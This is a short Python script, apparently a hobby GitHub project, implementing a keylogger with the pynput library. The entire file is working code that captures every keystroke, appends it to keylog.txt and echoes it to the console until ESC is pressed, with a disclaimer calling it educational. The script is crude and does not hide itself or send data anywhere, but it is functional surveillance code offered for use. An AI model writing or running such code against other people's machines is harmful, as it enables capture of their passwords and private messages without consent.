# Simple keylogger using pynput library.
# It logs key presses that the user types and writes them into a file called keylog.txt. It will also print keylogger output to the console/terminal.
# If you would like to stop the keylogger, press the 'ESC' key.
# Disclaimer This code is for educational purposes only. Do not attempt to use it for illegal purposes.
# Author: Mikayelll1

from pynput import keyboard

def on_press(key):
    try:
        #This is for normal key entry within the functions parameters
        print('{0}'.format(
            key.char))
    except AttributeError:
        #This is for special key entry, so that it is not out of bounds within the functions parameters
        print('{0}'.format(
            key))
    with open("keylog.txt", "a") as f:
        f.write(str(key))
        f.close()

#This function is to stop the keylogger when 'ESC' is pressed by the user

def on_release(key):

    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# If you have any comments or extras that I can add to this project, please email me at notmikayelll@gmail.com or message me on GitHub. Thank you for viewing my project :)